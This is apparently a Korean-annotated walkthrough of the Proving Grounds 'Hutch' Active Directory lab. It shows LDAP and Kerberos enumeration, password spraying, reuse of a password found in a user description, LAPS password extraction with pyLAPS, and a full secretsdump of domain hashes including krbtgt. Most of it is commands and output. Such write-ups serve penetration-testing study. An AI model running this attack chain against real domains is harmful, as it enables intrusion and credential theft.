```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat ~/.zshrc | grep nnmap
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
                
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ cat nmap.log             
# Nmap 7.98 scan initiated Thu May 14 16:14:56 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.178.122
Nmap scan report for 192.168.178.122
Host is up (0.066s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Thu, 14 May 2026 07:16:25 GMT
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 07:15:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49762/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-14T07:16:28
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   65.61 ms 192.168.45.1
2   65.50 ms 192.168.45.254
3   65.92 ms 192.168.251.1
4   66.01 ms 192.168.178.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 16:17:08 2026 -- 1 IP address (1 host up) scanned in 131.84 seconds
                                                   
```

ldapsearch를 통해 `dc=Hutch, dc=offsec` 확보

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -H ldap://192.168.216.122 -x -s base
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=hutch,DC=offsec
ldapServiceName: hutch.offsec:hutchdc$@HUTCH.OFFSEC
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
serverName: CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi
 guration,DC=hutch,DC=offsec
schemaNamingContext: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=hutch,DC=offsec
namingContexts: CN=Configuration,DC=hutch,DC=offsec
namingContexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingContexts: DC=DomainDnsZones,DC=hutch,DC=offsec
namingContexts: DC=ForestDnsZones,DC=hutch,DC=offsec
isSynchronized: TRUE
highestCommittedUSN: 73793
dsServiceName: CN=NTDS Settings,CN=HUTCHDC,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=hutch,DC=offsec
dnsHostName: hutchdc.hutch.offsec
defaultNamingContext: DC=hutch,DC=offsec
currentTime: 20260515014053.0Z
configurationNamingContext: CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

확보한 DC사용 user 추출

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
Guest
rplacidi
opatry
ltaunton
acostello
jsparwell
oknee
jmckendry
avictoria
jfrarey
eaburrow
cluddy
agitthouse
fmcsorley

```

![[Pasted image 20260515105250.png]]

생성된 유저 목록으로 유효성 확인

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ./kerbrute_linux_386 userenum --dc 192.168.216.122 -d hutch.offsec users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/15/26 - Ronnie Flathers @ropnop

2026/05/15 11:14:36 >  Using KDC(s):
2026/05/15 11:14:36 >   192.168.216.122:88

2026/05/15 11:14:36 >  [+] VALID USERNAME:       ltaunton@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       opatry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       rplacidi@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jsparwell@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       acostello@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       oknee@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jmckendry@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       jfrarey@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       avictoria@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       cluddy@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       eaburrow@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       agitthouse@hutch.offsec
2026/05/15 11:14:36 >  [+] VALID USERNAME:       fmcsorley@hutch.offsec
2026/05/15 11:14:36 >  Done! Tested 14 usernames (13 valid) in 0.140 seconds

```

AS-REP Roasting 수행 시 사전 인증이 활성화 된 사용자 없음
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-GetNPUsers hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User rplacidi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User opatry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ltaunton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User acostello doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsparwell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oknee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jmckendry doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User avictoria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jfrarey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eaburrow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cluddy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User agitthouse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fmcsorley doesn't have UF_DONT_REQUIRE_PREAUTH set

```

password spray 시도

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\fmcsorley:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\fmcsorley:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:opatry STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:opatry STATUS_LOGON_FAILURE 
<SNIP>
```

일부 사용자 중 설명 란에 암호를 남긴다는 사실 파악 후 확인
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ ldapsearch -x -H ldap://192.168.216.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=*))"  | grep description:
description: Built-in account for guest access to the computer/domain
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Password set to CrabSharkJellyfish192 at user's request. Please c

```

획득한 `CrabSharkJellyfish192`를 사용하여 password spray 
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p "CrabSharkJellyfish192" --continue-on-success --ignore-pw-decoding  
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
                                                                                                          
```

유효한 자격증명을 사용하여 bloodhound-python으로 추가 정보 획득 시도
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hutch.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: hutchdc.hutch.offsec
INFO: Done in 00M 13S

```

누락되는 부분 없도록 공유폴더에 접근 권한 확인 - 유효 정보 없음음
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ smbmap -H 192.168.216.122 -u fmcsorley -p CrabSharkJellyfish192

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                                              [|] Checking for open ports...                                                                                              [*] Detected 1 hosts serving SMB
[/] Initializing hosts...                                                                                                   [*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[-] Enumerating shares...                                                                                                                   
[+] IP: 192.168.216.122:445     Name: 192.168.216.122           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[\] Closing connections..                                                                                                   [|] Closing connections..                                                                                                   [/] Closing connections..                                                                                                   [-] Closing connections..                                                                                                   [\] Closing connections..                                                                                                   [|] Closing connections..                                                                                                   [/] Closing connections..                                                                                                   [-] Closing connections..                                                                                                   [*] Closed 1 connections                          
```

bloodhound 확인 시 ReadAPSPpassword 권한 보유
![[Pasted image 20260515142817.png]]


pylaps 활용하여 자격증명 탈취 `+CS0-.gm5l4o-[`

```bash
┌──(kali㉿kali)-[~/git/pyLAPS]
└─$ python pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.216.122 
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | HUTCHDC$             : +CS0-.gm5l4o-[
[+] All done!

```

![[Pasted image 20260515143503.png]]

획득한 패스워드로 자격증명 확인
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ netexec smb 192.168.216.122 -u administrator -p "+CS0-.gm5l4o-[" -d hutch.offsec
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\administrator:+CS0-.gm5l4o-[ (Pwn3d!)

```

![[Pasted image 20260515144914.png]]

secertdump 실행하여 모든 사용자의 해시값 덤프
```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-secretsdump hutch.offsec/administrator:'+CS0-.gm5l4o-['@192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb24173e6ac9aa789ab05a4acceeb27ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
HUTCH\HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCH\HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCH\HUTCHDC$:des-cbc-md5:b3109e01cd0b9215
HUTCH\HUTCHDC$:plain_password_hex:cfe66ec95c073fee9760be02b1a17f7cde75c45762b4dbc12360d83a81c5c428b3c382dbfd903cb123fd9da96662300d14afcd68b5d805728c14fca94e0a5fd634420ae3ffa8e6ab29c2814545b30bfbf3b8cdff4b2b143905849077f3ec4b7cea71d6f194bf5971bf96b80bd3ce4f519baa13d353ace8660605437ec58a8c33fde491dfe6bdaf9eea72bd1819b73d65c600419b36f79007f1221201f8d863838ee7587c5e98d0f9d7c1f08e0aa90af3f088100f29d963b30f7bd42fd460135403e1d2a8e197421f61f2710343d23a111ba720de6b8ad4b245079c2a3f868dd4ae269060af8d6d90f2244b2e35aa04b2
HUTCH\HUTCHDC$:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb818f6846ad0c5c47237a32eee5c2c30b0f739c0
dpapi_userkey:0x9c047d0b5fde15f60714f1411579b93a45dd5872
[*] NL$KM 
 0000   41 34 3F B6 A2 15 2F 99  E2 AA 6C 70 8C 5D 08 DA   A4?.../...lp.]..
 0010   C8 D0 7D ED 67 E9 35 73  A0 31 42 22 C5 A3 4C F2   ..}.g.5s.1B"..L.
 0020   CD C3 EE 84 3E 86 26 A0  EC 91 48 AB A1 62 85 19   ....>.&...H..b..
 0030   4F 37 C8 BC 78 4C 6A 54  36 63 95 0E 82 A0 72 57   O7..xLjT6c....rW
NL$KM:41343fb6a2152f99e2aa6c708c5d08dac8d07ded67e93573a0314222c5a34cf2cdc3ee843e8626a0ec9148aba16285194f37c8bc784c6a543663950e82a07257
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1722dc7b059af8df626c88ee2d279e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c37d961d2fbbc1eb9e4d09f145ad361:::
hutch.offsec\rplacidi:1103:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\opatry:1104:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\ltaunton:1105:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\acostello:1106:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jsparwell:1107:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\oknee:1108:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jmckendry:1109:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\avictoria:1110:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jfrarey:1111:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\eaburrow:1112:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\cluddy:1113:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\agitthouse:1114:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\fmcsorley:1115:aad3b435b51404eeaad3b435b51404ee:83bcf188adc71adef071303fae29c1c7:::
hutch.offsec\domainadmin:1116:aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7:::
HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72b3208e74a805b2a5eb19fdaefe646a0ab2ac20383f662005b98f50db5bc12e
Administrator:aes128-cts-hmac-sha1-96:1541be57c4bd258d96c5b21db72a06c7
Administrator:des-cbc-md5:8698d902ea9e9da4
krbtgt:aes256-cts-hmac-sha1-96:dc0de1944fc0218c5129c7b945f294be4940d5c4da9e632bc1c21c38a97974db
krbtgt:aes128-cts-hmac-sha1-96:927cd0e8ad96f8acfe8a76c15e2580d0
krbtgt:des-cbc-md5:023854fd2fd902dc
hutch.offsec\rplacidi:aes256-cts-hmac-sha1-96:7b5d40ea6108d29863a8079220b7b5142803a9c85d8c40ce65a73eed4fc71ab9
hutch.offsec\rplacidi:aes128-cts-hmac-sha1-96:ed21b067b78145b37eff06d98a4828ff
